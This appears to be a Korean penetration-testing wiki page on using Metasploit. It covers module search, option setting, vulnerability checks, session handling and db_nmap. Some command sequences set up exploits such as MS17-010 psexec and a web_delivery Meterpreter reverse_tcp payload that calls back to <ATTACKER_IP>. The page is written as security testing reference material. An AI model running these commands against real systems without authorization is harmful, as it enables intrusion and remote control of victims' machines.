---
tags:
  - 기능/취약점검증
실행환경: ["Linux"]
필요조건: ["대상에 맞는 module과 필수 option"]
결과: ["취약점 후보", "세션", "명령 실행"]
---

# metasploit

## 도구 개요

Metasploit Framework는 대상 서비스에 맞는 module과 payload를 검색·설정·실행하고, 취약 여부 확인부터 세션과 스캔 결과 관리까지 한 콘솔에서 다루는 프레임워크다. 여러 옵션과 반복 실행을 일관된 작업 흐름으로 관리할 때 유용하다.

## 필요한 입력과 실행 환경

- 실행 위치: Metasploit Framework가 설치된 Linux 호스트
- 필요한 입력: 식별한 서비스/제품/버전과 대응 module, `RHOSTS` 등 module의 필수 option
- reverse payload 입력: 대상 platform/architecture에 맞는 payload와 대상에서 접근 가능한 `LHOST`/`LPORT`
- 선택 환경: `msfdb`를 초기화하면 host, service, vulnerability와 loot를 workspace 단위로 관리할 수 있다.


## 표준 사용법

```shell
msfconsole
```

프롬프트 안에서 모듈을 검색하고 선택한 뒤 옵션을 설정한다.

```text
msf6 > search type:exploit apache
msf6 > use exploit/multi/http/example_module
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS <TARGET>
msf6 exploit(...) > check
msf6 exploit(...) > run
```

## 대표 예시

### 데이터베이스 초기화

```shell
msfdb init
msfconsole
```

Metasploit DB를 사용하면 `services`, `hosts`, `vulns`, `loot` 같은 명령으로 스캔 결과와 세션 정보를 정리하기 쉽다.

### 모듈 검색

```text
msf6 > search type:exploit platform:windows smb
msf6 > search cve:2017 name:smb
```

서비스명, CVE, 플랫폼, 모듈 타입을 함께 걸어 검색한다.

### 모듈 선택과 옵션 확인

```text
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) > show options
msf6 exploit(windows/smb/ms17_010_psexec) > show payloads
```

`show options`로 필수 옵션을 확인하고, 모듈에 맞는 payload 목록을 확인한다.

### 대상/인증 정보 설정

```text
msf6 exploit(...) > set RHOSTS <TARGET>
msf6 exploit(...) > set SMBUser <USER>
msf6 exploit(...) > set SMBPass '<PASSWORD>'
msf6 exploit(...) > set LHOST tun0
```

`RHOSTS`는 대상, `LHOST`는 리버스 연결을 받을 인터페이스/IP다. 옵션명은 모듈마다 다르므로 `show options`를 기준으로 맞춘다.

### 취약 여부 확인

```text
msf6 exploit(...) > check
```

모듈이 `check`를 지원하면 실제 실행 전 취약 가능성을 먼저 확인한다. `check`의 `unknown` 또는 미지원 결과는 취약·비취약 어느 쪽도 확정하지 못하므로 제품·버전·설정과 모듈 전제를 수동으로 다시 확인한다.

### 모듈 실행 전 판정 순서

| 단계 | Metasploit에서 확인할 내용 | 다음 판단 |
|---|---|---|
| 모듈 선택 | `info`의 제품·버전·운영체제·architecture·CVE와 대상 지문 | 불일치하면 다른 모듈을 찾거나 [[Public Exploit 검토와 검증]]으로 돌아간다. |
| 필수 입력 | `show options`의 required 값, URI, SSL, target index | 값의 출처와 대상 주소를 확인한 뒤 누락 항목을 설정한다. |
| payload 선택 | `show payloads`, reverse/bind 방향, target architecture | 대상이 공격 호스트의 `LHOST:LPORT`로 연결할 수 있는지 또는 bind port에 접근할 수 있는지 구분한다. |
| 저위험 검증 | `check` 지원 여부와 반환 근거 | `unknown`을 실행 성공으로 취급하지 않고 수동 전제를 확인한다. |
| 실행 결과 | `session opened`, session type, 첫 identity 명령 | shell이면 [[Reverse Shell 획득]], Meterpreter이면 [[Meterpreter 세션 후속 행동]]으로 연결한다. |

`session opened`가 없을 때는 취약점 요청 실패와 callback 실패를 구분한다. 모듈 오류가 없더라도 reverse payload를 선택했다면 수신 포트의 bind 상태와 대상에서 공격 호스트까지의 TCP 경로를 별도로 확인한다.

### 실행과 세션 진입

```text
msf6 exploit(...) > run
msf6 exploit(...) > sessions -l
msf6 exploit(...) > sessions -i 1
```

세션이 열리면 `sessions -i`로 진입하고, `background`로 다시 msfconsole로 돌아올 수 있다.

### Web Delivery로 PowerShell 실행 명령 생성

Windows 대상에서 PowerShell 명령을 이미 실행할 수 있고 Meterpreter 기능이 필요할 때 사용한다.

```text
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST <ATTACKER_IP>
msf6 exploit(multi/script/web_delivery) > set SRVHOST <ATTACKER_IP>
msf6 exploit(multi/script/web_delivery) > set TARGET 2
msf6 exploit(multi/script/web_delivery) > exploit
```

확인할 출력:

- `Using URL`은 stage를 제공할 HTTP 경로다.
- `Run the following command on the target machine`의 명령은 해당 실행에서 생성된 URL과 payload를 포함한다.
- `Exploit completed, but no session was created`는 대상 명령 실행 전에도 표시될 수 있다. HTTP 서버·handler 시작과 대상 PowerShell 실행 뒤의 `session opened`를 따로 확인한다.

### db_nmap으로 스캔 결과 연동

```text
msf6 > db_nmap -sC -sV -p 22,80,445 <TARGET>
msf6 > services
```

Nmap 결과를 Metasploit DB에 바로 저장한다.

### 리소스 스크립트 실행

```shell
msfconsole -q -r run.rc
```

반복 설정이 많은 경우 `set`, `run`, `sessions` 명령을 `.rc` 파일에 넣어 자동화할 수 있다.

## 주요 옵션과 명령

| 명령 | 의미 |
| --- | --- |
| `search <query>` | 모듈 검색 |
| `use <module>` | 모듈 선택 |
| `info` | 모듈 설명과 참고 정보 확인 |
| `show options` | 설정 가능한 옵션 확인 |
| `show payloads` | 호환 payload 확인 |
| `set <key> <value>` | 현재 모듈 옵션 설정 |
| `setg <key> <value>` | 전역 옵션 설정 |
| `unset`/`unsetg` | 옵션 해제 |
| `check` | 취약 여부 확인 |
| `run`/`exploit` | 모듈 실행 |
| `run -j` | job으로 백그라운드 실행 |
| `sessions -l` | 세션 목록 확인 |
| `sessions -i <id>` | 세션 진입 |
| `background` | 세션을 백그라운드로 전환 |
| `jobs`/`jobs -k <id>` | 백그라운드 job 확인/종료 |
| `db_nmap` | Nmap 스캔 결과를 DB에 저장 |
| `hosts`/`services`/`vulns` | DB에 저장된 정보 확인 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| `check`가 vulnerable/appears 출력 | 모듈 전제 조건 충족 가능성 | 옵션을 재확인하고 exploit 실행 여부 판단 |
| session opened | payload 실행과 세션 획득 성공 | 세션 권한, 안정성, 네트워크 위치 확인 |
| exploit failed/no session | 취약하지 않거나 옵션/payload 불일치 | RHOSTS, TARGET, payload, LHOST, 방화벽 확인 |
| crash/서비스 중단 징후 | 모듈 영향이 큼 | 재시도 전 서비스 상태와 대체 검증 방법 확인 |
| target mismatch | 모듈 target 또는 버전 불일치 | 정확한 제품/버전, architecture, target 옵션 확인 |
| check 불확실 | 모듈 검증 로직 한계 | 수동 PoC, 배너, 패치 상태로 교차 확인 |
| exploit 중단/오류 | 옵션 누락 또는 의존성 문제 | `show options`, `setg`, 모듈 문서, 로그 확인 |
| 요청은 전송됐지만 session 없음 | 대상이 취약하지 않거나 payload·callback 경로가 맞지 않음 | 취약 조건과 `LHOST`·`LPORT`·방화벽·handler를 분리 확인 |
| Web Delivery 서버는 시작됐지만 session 없음 | 대상 명령 미실행, stage HTTP 연결 실패 또는 reverse callback 실패 | 생성 명령 실행, SRVHOST·SRVPORT와 LHOST·LPORT 연결을 순서대로 확인 |
| session은 열렸지만 `whoami`·`id` 실패 | session 유형 불일치 또는 불안정한 payload | `sessions -l`, session type과 payload를 확인한 뒤 다시 진입 |

## 관련 공격기법

- [[Public Exploit 검토와 검증]]
- [[MS17-010 EternalBlue SMB RCE]]
- [[MSFVenom Payload 생성과 Handler 수신]]
- [[Reverse Shell 획득]]
- [[Metasploit Web Delivery로 Meterpreter 세션 획득]]
